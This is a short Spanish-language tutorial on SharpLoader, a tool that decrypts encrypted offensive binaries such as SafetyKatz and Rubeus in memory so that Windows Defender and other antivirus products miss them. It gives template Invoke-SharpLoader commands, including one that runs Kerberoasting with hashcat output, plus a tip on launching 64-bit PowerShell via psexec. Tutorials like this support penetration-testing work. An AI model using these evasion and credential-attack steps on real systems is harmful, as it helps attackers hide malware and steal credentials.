Este par de herramientas sirven para cosas completamente diferentes, pero hablaremos principalmente de que trata cada una, empecemos con SharpLoader:

# SharpLoader

Esta herramienta es realmente útil para evadir al windows defender u otros antivirus, ¿Por qué?, básicamente hace uso de binarios que están encriptados (SafetyKatz.enc, Rubeus.enc, etc...) y nos desencripta en la memoria, haciendo que sea mas dificil de detectar para el  antivirus , nosotros mismos podemos encriptar binarios .exe usando SharpEncrypt, herramienta de la cual hablaremos en un momento, es importante tener en cuenta que si el proceso (desde donde se ejecuta el comando, usualmente powershell) es de 32 bits pero el binario (ej: SafetyKatz) es de 64 bits, no va a funcionar, el comando para usar SharpLoader es el siguiente:

```python
Invoke-SharpLoader -location {URL o RUTA del encriptado} -password {contraseña con la que se encripto el binario}  -noArgs
```

### Si quieres especificar algún argumento para el binario


```python
Invoke-SharpLoader -location {URL o RUTA del encriptado} -password {contraseña con la que se encripto el binario}  -argument "kerberoasting" -argument2 "/format:hashcat"
```


Para esto necesitamos un proceso de 64 bits, por ende cuando ejecutemos el psexec usar la ruta 



C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe 

